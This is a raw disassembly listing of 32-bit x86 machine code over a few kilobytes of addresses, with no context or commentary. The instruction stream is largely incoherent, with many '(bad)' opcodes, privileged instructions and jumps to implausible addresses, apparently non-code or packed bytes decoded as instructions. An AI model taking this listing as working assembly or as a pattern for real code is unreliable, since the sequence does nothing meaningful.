  431a45:	xor    esi,DWORD PTR [ebx]
  431a47:	add    eax,DWORD PTR [ebx]
  431a49:	loopne 0x431a5a
  431a4b:	dec    ebp
  431a4c:	ror    DWORD PTR [edx+0x7233084d],0x3
  431a53:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431a59:	lock cdq 
  431a5b:	ret    
  431a5c:	xor    al,BYTE PTR [ebp-0x77]
  431a5f:	mov    esi,esp
  431a61:	rol    BYTE PTR [ebp-0x7c],1
  431a64:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431a6a:	call   edi
  431a6c:	enter  0x4d45,0x8b
  431a70:	mov    esi,eax
  431a72:	fmul   st(3),st
  431a74:	push   ebp
  431a75:	dec    ebp
  431a76:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431a7c:	ret    0xc199
  431a7f:	xor    al,BYTE PTR [esi-0x280276]
  431a85:	dec    ebp
  431a86:	jne    0x431abb
  431a88:	mov    eax,DWORD PTR [ebx]
  431a8a:	cld    
  431a8b:	loopne 0x431a3d
  431a8d:	push   ebp
  431a8e:	add    DWORD PTR [eax+0x72851100],ecx
  431a94:	inc    DWORD PTR [eax]
  431a96:	inc    DWORD PTR [ebp-0x75]
  431a99:	mov    edi,esp
  431a9b:	lock add bl,0x1
  431a9f:	retf   
  431aa0:	add    dh,al
  431aa2:	xor    dh,cl
  431aa4:	inc    ebp
  431aa5:	scas   eax,DWORD PTR es:[edi]
  431aa6:	mov    eax,DWORD PTR [ebx]
  431aa8:	shl    al,0x0
  431aab:	inc    ebp
  431aac:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431ab2:	call   0x462cea
  431ab7:	ud0    eax,ecx
  431aba:	adc    al,0x4d
  431abc:	inc    ebp
  431abd:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431ac3:	lock push 0x338055
  431ac9:	add    eax,DWORD PTR [eax]
  431acb:	ud0    ecx,edx
  431ace:	sbb    BYTE PTR [ebp+0x5e],dl
  431ad1:	xor    ecx,ecx
  431ad3:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431ada:	push   ecx
  431adb:	add    BYTE PTR [ebp-0x38],cl
  431ade:	mov    DWORD PTR [esi-0x740004],eax
  431ae4:	cld    
  431ae5:	inc    ebp
  431ae6:	nop
  431ae7:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431aed:	xabort 0xaf
  431af0:	icebp  
  431af1:	mov    esi,DWORD PTR [ebp-0x28]
  431af4:	(bad)  
  431af5:	retf   
  431af6:	or     ecx,eax
  431af8:	(bad)  
  431af9:	dec    ebp
  431afa:	pop    es
  431afb:	(bad)  
  431afc:	(bad)  
  431afd:	or     BYTE PTR [esi],al
  431aff:	jb     0x431ac7
  431b01:	add    BYTE PTR [ebx],al
  431b03:	inc    ebp
  431b04:	(bad)  
  431b05:	mov    ecx,DWORD PTR [edx]
  431b07:	fadd   st(6),st
  431b09:	ret    
  431b0a:	add    ah,BYTE PTR [edi-0x37]
  431b0d:	int    0x55
  431b0f:	sub    ebp,esp
  431b11:	add    edx,DWORD PTR [ecx-0x14]
  431b14:	inc    ebp
  431b15:	inc    ebp
  431b16:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431b1c:	cld    
  431b1d:	(bad)  
  431b1e:	mov    WORD PTR [edi+0xf893be0],gs
  431b24:	mov    ebp,ebp
  431b26:	clc    
  431b27:	push   eax
  431b29:	push   DWORD PTR [ebp-0x4]
  431b2c:	mov    BYTE PTR [ebp+0xa],0xff
  431b30:	(bad)  
  431b31:	int3   
  431b32:	or     BYTE PTR [eax],al
  431b34:	(bad)  
  431b35:	lea    eax,[edi]
  431b37:	ins    BYTE PTR es:[edi],dx
  431b38:	(bad)  
  431b39:	inc    DWORD PTR [ecx]
  431b3b:	push   eax
  431b3c:	mov    BYTE PTR [ebp+0x9],0x8b
  431b40:	leave  
  431b41:	les    edx,FWORD PTR [ebp+0x0]
  431b44:	in     al,dx
  431b45:	call   DWORD PTR [ecx-0x75]
  431b48:	inc    ebp
  431b49:	cld    
  431b4a:	mov    DWORD PTR [eax+0x8b01fc],eax
  431b50:	cld    
  431b51:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431b57:	std    
  431b58:	mov    eax,DWORD PTR [eax]
  431b5a:	clc    
  431b5b:	test   eax,esi
  431b5d:	je     0x431bd4
  431b5f:	mov    eax,esi
  431b61:	cld    
  431b62:	add    al,0x80
  431b64:	add    WORD PTR [ecx+0x0],ax
  431b68:	fiadd  DWORD PTR [eax]
  431b6a:	mov    BYTE PTR [eax],0xd6
  431b6d:	push   0xffffffc3
  431b6f:	push   edi
  431b70:	mov    edx,DWORD PTR [eax+0x51]
  431b73:	pop    edi
  431b74:	lea    ebx,[ebx-0x8]
  431b77:	ret    0x45
  431b7a:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431b80:	xchg   eax,edi
  431b82:	mov    DWORD PTR [ebp-0x75],ecx
  431b85:	push   esi
  431b86:	clc    
  431b87:	jne    0x431b59
  431b89:	mov    ecx,0xf8450b0b
  431b8e:	(bad)  
  431b8f:	push   cs
  431b90:	or     BYTE PTR [ebp-0x3a],dh
  431b93:	cmp    eax,DWORD PTR [ecx]
  431b95:	pop    esi
  431b96:	(bad)  
  431b97:	or     al,0x5
  431b99:	inc    eax
  431b9a:	leave  
  431b9b:	jmp    0x40cf:0x21564204
  431ba2:	leave  
  431ba3:	jmp    0xdace5ca7
  431ba8:	mov    eax,DWORD PTR [edx-0x3a]
  431bab:	jle    0x431ba3
  431bad:	inc    eax
  431bae:	nop
  431baf:	in     al,dx
  431bb0:	inc    ebx
  431bb2:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431bb8:	add    eax,0xff45e8f8
  431bbd:	push   esi
  431bbe:	push   DWORD PTR [ebp-0x39]
  431bc1:	mov    eax,0x7e9da46
  431bc6:	or     al,0x6
  431bc8:	push   DWORD PTR [ebp-0x3a]
  431bcb:	cmp    eax,DWORD PTR [edx]
  431bcd:	pop    esi
  431bce:	ret    
  431bcf:	or     al,0x56
  431bd1:	inc    ecx
  431bd2:	push   ebp
  431bd3:	jle    0x431bc1
  431bd5:	inc    edx
  431bd6:	inc    ebp
  431bd7:	leave  
  431bd8:	add    DWORD PTR [ecx+0x28],eax
  431bdb:	and    esp,edi
  431bdd:	inc    ecx
  431bde:	jne    0x431bc7
  431be0:	add    DWORD PTR [edx+0x1c],eax
  431be3:	retf   0xc38b
  431be6:	adc    al,0x8b
  431be8:	xchg   edx,eax
  431be9:	push   ecx
  431bea:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431bf0:	rcl    DWORD PTR [esi-0x9],cl
  431bf3:	jne    0x431c45
  431bf5:	mov    eax,0x7c80ece
  431bfa:	rol    DWORD PTR [esi],cl
  431bfc:	div    DWORD PTR [ebp+0x50]
  431bff:	cmp    ecx,edx
  431c01:	pop    esi
  431c02:	dec    BYTE PTR [edx]
  431c04:	in     al,dx
  431c05:	inc    edx
  431c06:	sub    ebp,ebp
  431c08:	inc    eax
  431c09:	(bad)  
  431c0a:	push   eax
  431c0b:	add    edx,DWORD PTR [eax-0x13]
  431c0e:	push   edi
  431c0f:	add    dh,dh
  431c11:	leave  
  431c12:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431c16:	add    BYTE PTR [ecx+0x0],dl
  431c19:	inc    ebp
  431c1a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431c20:	add    BYTE PTR [eax-0x7fbf448],bh
  431c26:	add    al,0x2
  431c28:	jmp    0x57ec782
  431c2d:	jne    0x431c17
  431c2f:	mov    eax,DWORD PTR [edx]
  431c31:	or     BYTE PTR [eax],al
  431c33:	inc    ecx
  431c34:	stc    
  431c35:	jmp    0xe7825c70
  431c3a:	jge    0x431c7d
  431c3c:	mov    esi,ebp
  431c3e:	lock ret 0x7d
  431c42:	and    ecx,DWORD PTR [ebx-0x171777]
  431c48:	add    bh,bh
  431c4a:	aad    0xd7
  431c4c:	add    dh,cl
  431c4e:	clts   
  431c50:	(bad)  
  431c51:	call   0xffce1b56
  431c56:	hlt    
  431c57:	iret   
  431c58:	jge    0x431c30
  431c5a:	rol    DWORD PTR [esi-0x80],cl
  431c5d:	cmc    
  431c5e:	or     BYTE PTR [edi-0x27],cl
  431c61:	(bad)  
  431c62:	out    dx,al
  431c63:	mov    eax,DWORD PTR [ebx]
  431c65:	(bad)  
  431c66:	pop    esi
  431c67:	push   es
  431c68:	cmp    al,0xe8
  431c6a:	sar    edi,0x8
  431c6d:	inc    DWORD PTR [edi]
  431c6f:	inc    esi
  431c70:	(bad)  
  431c71:	in     al,dx
  431c72:	jle    0x431ccb
  431c74:	push   cs
  431c75:	push   ebx
  431c76:	add    BYTE PTR [ebx+0x24008b56],cl
  431c7c:	add    BYTE PTR [ebp+0x50],al
  431c7f:	push   eax
  431c80:	add    DWORD PTR [ebx+0x757d1834],ecx
  431c86:	sub    edx,DWORD PTR [esi-0x24]
  431c89:	jne    0x431c41
  431c8b:	lods   eax,DWORD PTR ds:[esi]
  431c8c:	mov    edx,DWORD PTR [edx-0x34]
  431c8f:	dec    esi
  431c90:	out    0x83,eax
  431c92:	into   
  431c93:	push   edi
  431c95:	loopne 0x431c65
  431c97:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431c9b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431ca2:	rol    DWORD PTR [edx],0x8
  431ca5:	mov    esp,ecx
  431ca7:	cmp    DWORD PTR [ebx],0xc
  431caa:	mov    esi,0x5001c0
  431caf:	push   eax
  431cb0:	push   cs
  431cb1:	push   eax
  431cb2:	(bad)  
  431cb3:	sub    edx,edi
  431cb5:	push   esi
  431cb6:	adc    al,0xcb
  431cb8:	ins    DWORD PTR es:[edi],dx
  431cb9:	mov    eax,0x203e8
  431cbe:	add    al,ah
  431cc0:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431cc7:	add    dh,al
  431cc9:	add    ah,ch
  431ccb:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431cd1:	pop    ecx
  431cd2:	or     eax,ebx
  431cd4:	cli    
  431cd5:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431cdb:	lea    ebp,[ebx]
  431cdd:	mov    edx,DWORD PTR [edx-0x4]
  431ce0:	dec    ecx
  431ce1:	inc    ebp
  431ce2:	shr    BYTE PTR [ebx],0x4b
  431ce5:	and    al,0x0
  431ce7:	(bad)  
  431ce8:	jne    0x431d2f
  431cea:	pop    eax
  431ceb:	mov    al,0x5a
  431ced:	call   0x1421f4c
  431cf2:	and    al,0x85
  431cf4:	push   edx
  431cf5:	add    BYTE PTR [eax+eax*1+0x0],ah
  431cf9:	dec    ebp
  431cfa:	mov    cl,0x23
  431cfc:	jmp    0x431cea
  431cfe:	mov    al,0xe7
  431d00:	call   0x1391fee
  431d05:	shr    DWORD PTR [eax+ebx*2],cl
  431d08:	lock (bad) 
  431d0a:	adc    eax,0x757f008d
  431d0f:	out    0x58,eax
  431d11:	cmp    al,0x7
  431d13:	pop    edx
  431d14:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431d1b:	push   ecx
  431d1c:	cld    
  431d1d:	mov    esi,0x3b0175
  431d22:	and    al,0xb0
  431d24:	xor    BYTE PTR [edx+0x1],0x8b
  431d28:	add    ah,bh
  431d2a:	mov    edi,DWORD PTR [ebp-0x4]
  431d2d:	psubsw mm7,QWORD PTR [edi]
  431d30:	add    DWORD PTR [ebp+0x0],ebp
  431d33:	rcr    eax,1
  431d35:	mov    edi,ecx
  431d37:	and    eax,DWORD PTR [eax]
  431d39:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431d3f:	call   0x1302028
  431d44:	add    al,cl
  431d46:	mov    ebp,esi
  431d48:	aam    0x83
  431d4a:	or     DWORD PTR [ecx],eax
  431d4c:	jne    0x431d3f
  431d4e:	mov    eax,DWORD PTR [eax]
  431d50:	aam    0x0
  431d52:	dec    ebp
  431d53:	jne    0x431ce0
  431d55:	cmp    ebx,eax
  431d57:	jb     0x431da6
  431d59:	jmp    0x431ce6
  431d5b:	mov    ebx,esp
  431d5d:	int3   
  431d5e:	dec    ebp
  431d5f:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431d66:	mov    edx,0x8b0a8b
  431d6b:	cmp    ecx,DWORD PTR [eax]
  431d6d:	jb     0x431d46
  431d6f:	pop    edx
  431d70:	push   edi
  431d71:	cli    
  431d72:	pop    es
  431d73:	mov    eax,ecx
  431d75:	jb     0x431d79
  431d77:	add    DWORD PTR [ebx],0xa
  431d7a:	mov    eax,DWORD PTR [ebx]
  431d7c:	int3   
  431d7d:	add    bh,BYTE PTR [esi+0x75d10006]
  431d83:	jmp    0x431d10
  431d85:	mov    al,0xe8
  431d87:	call   0x1042009
  431d8c:	add    edx,DWORD PTR [ecx+ecx*8]
  431d8f:	pop    edi
  431d90:	or     BYTE PTR [ecx-0x73],bl
  431d93:	pop    ecx
  431d94:	inc    edi
  431d95:	xor    al,0xeb
  431d97:	push   ecx
  431d98:	mov    edi,DWORD PTR [edx+0xc506cc]
  431d9e:	call   0xb21ea3
  431da3:	int3   
  431da4:	sbb    BYTE PTR [esi],ch
  431da6:	inc    ebp
  431da7:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431dad:	call   0x9c201c
  431db2:	or     BYTE PTR [ebx-0x73],dl
  431db5:	cmp    al,0x47
  431db7:	mov    al,0x1
  431db9:	jb     0x431dbb
  431dbb:	mov    al,0x10
  431dbd:	push   eax
  431dbe:	add    al,0x75
  431dc0:	add    BYTE PTR [ebx],ch
  431dc2:	add    ebx,esp
  431dc4:	int3   
  431dc5:	jne    0x431dd7
  431dc7:	movsx  edx,cl
  431dca:	add    DWORD PTR [eax],eax
  431dcc:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431dd3:	mov    gs,edi
  431dd5:	add    BYTE PTR [eax-0x50],ch
  431dd8:	add    al,ch
  431dda:	mov    eax,DWORD PTR [ecx]
  431ddc:	sub    eax,DWORD PTR [eax]
  431dde:	jb     0x431e55
  431de0:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431de4:	jge    0x431dce
  431de6:	add    al,0x1
  431de8:	add    DWORD PTR [eax],0x0
  431deb:	jne    0x431ded
  431ded:	je     0x431e34
  431def:	mov    eax,DWORD PTR [edi]
  431df1:	ror    BYTE PTR [ebp+0x4d],1
  431df4:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431dfb:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431e01:	mov    DWORD PTR [ebx],ebp
  431e03:	fadd   DWORD PTR [eax+0x75]
  431e06:	inc    eax
  431e07:	pop    eax
  431e08:	lea    ebx,[ecx+0x4f]
  431e0b:	push   0xb1000003
  431e10:	out    dx,eax
  431e11:	add    ebp,DWORD PTR [edx+edx*2]
  431e14:	add    BYTE PTR [ebx+ecx*4],bh
  431e17:	mov    ch,BYTE PTR [ebx]
  431e19:	jb     0x431e8d
  431e1b:	add    al,0x89
  431e1d:	push   eax
  431e1e:	call   0x842b6b90
  431e23:	add    DWORD PTR [eax+eax*1],eax
  431e26:	jae    0x431e3c
  431e28:	icebp  
  431e29:	inc    ebp
  431e2a:	mov    eax,DWORD PTR gs:[ecx]
  431e2d:	int3   
  431e2e:	out    dx,al
  431e2f:	loopne 0x431e7e
  431e31:	sub    eax,DWORD PTR [edx]
  431e33:	push   0xffffff83
  431e35:	pop    esi
  431e36:	push   cs
  431e37:	jl     0x431e52
  431e39:	add    al,0xaf
  431e3b:	xor    eax,0x832b6d00
  431e40:	mov    eax,DWORD PTR [edx]
  431e42:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431e48:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431e4e:	inc    ebp
  431e4f:	shr    ebx,0x3
  431e52:	or     DWORD PTR [eax],0x4
  431e55:	push   0xffffffa5
  431e57:	pop    esi
  431e58:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431e5f:	jmp    0x431ebe
  431e61:	mov    edi,0xff0272
  431e66:	fdivr  QWORD PTR [ebp+0x5d]
  431e69:	push   0x4e
  431e6b:	pop    ecx
  431e6c:	call   0x436271
  431e71:	mov    DWORD PTR [ebx],eax
  431e73:	in     al,0xc8
  431e75:	rol    BYTE PTR [ebp-0x75],0xc1
  431e79:	call   0xad205a
  431e7e:	pop    esi
  431e7f:	enter  0xceff,0x8b
  431e83:	repz mov ecx,DWORD PTR [ebp-0x34]
  431e87:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431e8e:	je     0x431e90
  431e90:	or     DWORD PTR [ebx-0x74183b24],eax
  431e96:	jne    0x431e7c
  431e98:	jmp    0x431e93
  431e9a:	push   DWORD PTR [edx-0x24]
  431e9d:	push   0x4d
  431e9f:	pop    ecx
  431ea0:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431ea4:	jge    0x431eac
  431ea6:	mov    eax,eax
  431ea8:	sub    ebp,DWORD PTR [edx+0x24]
  431eab:	pop    esi
  431eac:	inc    ebp
  431ead:	mov    esp,0x8b6077
  431eb2:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431eb8:	lods   al,BYTE PTR ds:[esi]
  431eb9:	add    BYTE PTR [ebx],bh
  431ebb:	enter  0xce73,0x49
  431ebf:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431ec7:	stc    
  431ec8:	jge    0x431f3c
  431eca:	jnp    0xdd42a239
  431ed0:	call   0xc61fa6
  431ed5:	fadd   st(0),st
  431ed7:	dec    esi
  431ed8:	ins    BYTE PTR es:[edi],dx
  431ed9:	stc    
  431eda:	cmp    al,0x73
  431edc:	push   ebp
  431edd:	mov    eax,0xf8028b
  431ee2:	jne    0x431ea5
  431ee4:	mov    esi,ecx
  431ee6:	mov    esp,DWORD PTR [ebp+0x2c]
  431ee9:	add    edi,DWORD PTR [ebp-0x24]
  431eec:	sub    esp,eax
  431eee:	and    al,0x45
  431ef0:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431ef6:	sbb    al,0xee
  431ef8:	pop    esi
  431ef9:	call   0x831f29
  431efe:	fsubr  st,st(3)
  431f00:	sti    
  431f01:	add    BYTE PTR gs:[ecx],bh
  431f04:	add    eax,esp
  431f06:	add    DWORD PTR [esi],eax
  431f08:	rol    DWORD PTR [ebp+0x8],0x29
  431f0c:	mov    esp,eax
  431f0e:	clc    
  431f0f:	jne    0x431f86
  431f11:	mov    eax,0x8b0673
  431f16:	loopne 0x431f5d
  431f18:	loopne 0x431ea3
  431f1a:	lods   al,BYTE PTR ds:[esi]
  431f1b:	int3   
  431f1c:	inc    ebp
  431f1d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431f21:	add    al,0xc3
  431f23:	sub    ecx,DWORD PTR [ebp+0x47]
  431f26:	(bad)  
  431f28:	shr    BYTE PTR [ebp-0x1f],0xe8
  431f2c:	add    eax,DWORD PTR [eax]
  431f2e:	call   0x644e033
  431f33:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431f39:	dec    esi
  431f3a:	ins    DWORD PTR es:[edi],dx
  431f3b:	in     al,dx
  431f3c:	lea    eax,[eax]
  431f3e:	inc    ebp
  431f3f:	inc    ebp
  431f40:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431f46:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431f50:	and    al,0xdc
  431f52:	ror    DWORD PTR [edx+0x24],0xf7
  431f56:	or     BYTE PTR [ebp+0x4c],dh
  431f59:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431f5d:	stos   BYTE PTR es:[edi],al
  431f5e:	adc    edx,edi
  431f60:	inc    esp
  431f61:	add    edi,DWORD PTR [eax]
  431f63:	jne    0x431f48
  431f65:	mov    DWORD PTR [eax-0x7449db04],ecx
  431f6b:	cmp    ecx,DWORD PTR [edi]
  431f6d:	sub    BYTE PTR [ebp-0x7e],dl
  431f70:	sar    ebp,0xb
  431f73:	jmp    FWORD PTR [edi+0x2400392a]
  431f79:	sub    esi,DWORD PTR [ebx-0x73]
  431f7c:	mov    esp,DWORD PTR [ecx+edi*4]
  431f7f:	mov    ecx,DWORD PTR [eax]
  431f81:	and    BYTE PTR [eax],al
  431f83:	jne    0x431f4f
  431f85:	sub    ebp,ecx
  431f87:	sbb    BYTE PTR [esi+0x32],ah
  431f8a:	dec    ebp
  431f8b:	push   ebp
  431f8c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431f92:	ret    
  431f93:	mov    edx,ebp
  431f95:	leave  
  431f96:	sub    DWORD PTR [esi+0x24],ebx
  431f99:	ret    0x2b
  431f9c:	pop    ax
  431f9e:	push   ebp
  431f9f:	rol    BYTE PTR [ebx],0xeb
  431fa2:	add    DWORD PTR [ecx+0x6c0001],0x40
  431fa9:	jb     0x432000
  431fab:	ret    
  431fac:	in     al,dx
  431fad:	jecxz  0x431f3a
  431faf:	push   esi
  431fb0:	xchg   esp,eax
  431fb1:	jne    0x431fb3
  431fb3:	cmp    edx,DWORD PTR [esi+0x1c]
  431fb6:	jne    0x431f9c
  431fb8:	mov    eax,DWORD PTR [ebp-0x77]
  431fbb:	ror    DWORD PTR [ebx+0x899408],0xe0
  431fc2:	mov    esi,DWORD PTR [ebp-0x75]
  431fc5:	pop    esi
  431fc6:	nop
  431fc7:	mov    eax,DWORD PTR [eax]
  431fc9:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431fcf:	add    al,0x0
  431fd1:	inc    ebp
  431fd2:	mov    eax,DWORD PTR [ebx]
  431fd4:	mov    ebp,ebx
  431fd6:	cmp    al,0xf
  431fd8:	or     al,al
  431fda:	inc    ebp
  431fdb:	inc    ebp
  431fdc:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431fe4:	mov    bh,0xc0
  431fe6:	push   ss
  431fe7:	ins    BYTE PTR es:[edi],dx
  431fe8:	push   ecx
  431fe9:	add    BYTE PTR [ecx-0x5],dl
  431fec:	add    eax,0x17200
  431ff1:	sbb    al,0x85
  431ff3:	dec    esp
  431ff4:	je     0x43202e
  431ff6:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431ffa:	add    BYTE PTR [ebx],bh
  431ffc:	(bad)  
  431ffd:	and    al,0x39
  431fff:	jae    0x431f9d
  432001:	mov    cl,cl
  432003:	inc    DWORD PTR [esp]
  432006:	push   ebp
  432007:	shr    esp,0x8
  43200a:	in     al,dx
  43200b:	push   esp
  43200c:	add    DWORD PTR [eax],esp
  43200e:	add    bl,cl
  432010:	inc    ebp
  432011:	mov    bh,0x89
  432013:	add    ah,bh
  432015:	jmp    0xca7c2f5f
  43201a:	pushf  
  43201b:	dec    esp
  43201c:	mov    edx,0xf8178520
  432021:	fst    DWORD PTR [ebp+0x0]
  432024:	mov    BYTE PTR [eax],0xc4
  432027:	sub    edx,DWORD PTR [ebx-0x3f]
  43202a:	inc    ebp
  43202b:	add    eax,0xc601da
  432030:	mov    al,0xc6
  432033:	ins    BYTE PTR es:[edi],dx
  432034:	mov    DWORD PTR [eax+0x57],0x280545c1
  43203b:	dec    esp
  43203c:	jmp    DWORD PTR [eax]
  43203e:	inc    ebp
  43203f:	fnstcw WORD PTR [esi+0x29]
  432042:	test   BYTE PTR [eax],0xc6
  432045:	rol    BYTE PTR [eax],0xc0
  432048:	lea    ecx,[ebp-0x3cf0dbcb]
  43204e:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  432054:	inc    esi
  432055:	add    DWORD PTR [eax],ebx
  432057:	add    dh,bh
  432059:	mov    esi,DWORD PTR [edx+0x8]
  43205c:	(bad)  
  43205d:	fdiv   QWORD PTR ss:[ecx]
  432060:	(bad)  
  432061:	mov    bl,ch
  432063:	add    esi,eax
  432065:	add    dh,bl
  432067:	or     esi,eax
  432069:	mov    dl,0xdf
  43206b:	add    esi,eax
  43206d:	add    al,ah
  43206f:	push   cs
  432070:	mov    BYTE PTR [edx+0xc601e1],0xe2
  432077:	or     BYTE PTR [ebx],dh
  432079:	dec    ecx
  43207a:	lea    eax,[ebx]
  43207c:	xor    eax,0x18fc0fc7
  432081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432082:	repz clc 
  432084:	add    eax,DWORD PTR [ebp+0x46]
  432087:	prefetcht0 BYTE PTR [ecx-0x2]
  43208b:	xor    eax,0x7c60872
  432090:	mov    esp,0xbd32c699
  432095:	pop    esi
  432096:	mov    cl,0xbe
  432099:	or     al,0xc6
  43209b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4320a2:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4320a9:	add    dh,al
  4320ab:	mov    eax,ebx
  4320ad:	xor    DWORD PTR [ebx],0x35008dbc
  4320b3:	mov    ecx,DWORD PTR [edi]
  4320b5:	sbb    al,0x18
  4320b7:	inc    ebp
  4320b8:	xrelease mov DWORD PTR [ebx],0x188546f4
  4320bf:	clc    
  4320c0:	(bad)  
  4320c1:	ss jb  0x432060
  4320c4:	lea    ecx,[ecx+0x45ffe838]
  4320ca:	mov    ebp,esp
  4320cc:	fadd   st,st(6)
  4320ce:	dec    ebp
  4320cf:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4320d5:	out    0x1,eax
  4320d7:	inc    ebp
  4320d8:	lea    ebp,[ecx]
  4320da:	inc    esi
  4320dc:	dec    eax
  4320de:	enter  0xa33,0xc6
  4320e2:	push   ebp
  4320e3:	leave  
  4320e4:	(bad)  
  4320e5:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4320eb:	add    BYTE PTR [ebp+0x44],al
  4320ee:	mov    eax,esp
  4320f0:	mov    WORD PTR [esi+0x44398300],?
  4320f6:	psubusw mm4,QWORD PTR [eax-0x78]
  4320fa:	add    BYTE PTR [ebx-0x1303f975],al
  432100:	add    BYTE PTR [ebp+0x1],0xeb
  432104:	add    BYTE PTR [ebp+0x38],al
  432107:	jmp    0xdbce6651
  43210c:	add    BYTE PTR [ebp+0x0],0xe8
  432110:	mov    DWORD PTR [ebp-0x48],eax
  432113:	sub    DWORD PTR [edi+0x45],ecx
  432116:	add    BYTE PTR [eax],ch
  432118:	js     0x43215f
  43211a:	data16 jle 0x4320a2
  43211d:	idiv   bh
  43211f:	inc    esp
  432120:	(bad)  
  432121:	fadd   st(7),st
  432123:	mov    dh,0x89
  432125:	and    DWORD PTR [esi+0x44],0xffffffff
  432129:	fld    DWORD PTR [ebx-0x767cbc78]
  43212f:	pop    es
  432130:	push   0x8d45ffec
  432135:	jmp    0xe6cc663d
  43213a:	push   0x45
  43213c:	jmp    edx
  43213e:	add    DWORD PTR [ebp+0xd],0xfffffff5
  432142:	mov    DWORD PTR [ebp+0x6c],eax
  432145:	(bad)  
  432147:	inc    ebp
  432148:	(bad)  
  432149:	out    dx,al
  43214a:	add    al,0x45
  43214c:	mov    edi,esp
  43214e:	outs   dx,BYTE PTR ds:[esi]
  43214f:	inc    ebp
  432150:	(bad)  
  432151:	jle    0x4320d6
  432153:	idiv   BYTE PTR ds:0x70bc8944
  432159:	mov    dh,0xff
  43215b:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  432162:	jb     0x4320e7
  432164:	dec    DWORD PTR [eax]
  432166:	mov    ebp,esp
  432168:	test   WORD PTR [ebp-0x1],ax
  43216f:	inc    ebp
  432170:	ror    BYTE PTR [ebx-0x137a279a],0xff
  432177:	adc    edi,edi
  432179:	mov    ebp,edi
  43217b:	mov    eax,DWORD PTR [eax]
  43217d:	cmp    BYTE PTR [esi-0x1],ah
  432180:	test   DWORD PTR [ebx],edi
  432182:	push   DWORD PTR [ebp-0x1]
  432185:	mov    DWORD PTR [esi-0x48],ebp
  432188:	add    BYTE PTR [ebp+0x66],al
  43218b:	jmp    0x432112
  43218d:	pushf  
  43218e:	dec    DWORD PTR [ebx-0x7f940301]
  432194:	add    BYTE PTR [ecx],al
  432196:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43219d:	add    al,al
  43219f:	add    BYTE PTR [esi+0x45],ah
  4321a2:	test   DWORD PTR [ebx+0xff7cff],ecx
  4321a8:	inc    eax
  4321a9:	mov    DWORD PTR [eax],eax
  4321ab:	mov    esp,DWORD PTR [esi-0x4]
  4321ae:	inc    ebp
  4321af:	cmp    BYTE PTR [eax+0x4701],0x38
  4321b6:	mov    DWORD PTR [ebp-0x7e],ebp
  4321b9:	add    BYTE PTR [edi-0x73],al
  4321bc:	push   0xffffffcd
  4321be:	mov    WORD PTR [ebp+0x64],ax
  4321c2:	(bad)  
  4321c3:	call   eax
  4321c5:	mov    esp,esi
  4321c7:	data16 cmc 
  4321c9:	test   DWORD PTR [ebp-0x1],eax
  4321cc:	(bad)  
  4321ce:	out    0xc0,eax
  4321d0:	lea    esp,[esi-0x30]
  4321d3:	test   DWORD PTR [edx+0x44ff80ff],ecx
  4321d9:	inc    edi
  4321da:	jmp    0x75ff:0x40858866
  4321e1:	dec    DWORD PTR [ebp-0x7a992f40]
  4321e7:	test   esi,edi
  4321e9:	(bad)  
  4321ea:	(bad)  
  4321eb:	inc    DWORD PTR [ebp-0x9901b9]
  4321f1:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  4321f7:	rcl    BYTE PTR [ecx+0x66],0x33
  4321fb:	test   DWORD PTR [ebx+0xff72ff],edi
  432201:	inc    edi
  432202:	ret    
  432203:	mov    ax,WORD PTR [ebp-0x3f0004]
  43220a:	push   eax
  43220b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432212:	add    BYTE PTR [ebx-0x764f0839],al
  432218:	push   DWORD PTR [esi+0x1]
  43221b:	inc    DWORD PTR [eax]
  43221d:	mov    eax,0xff99ff
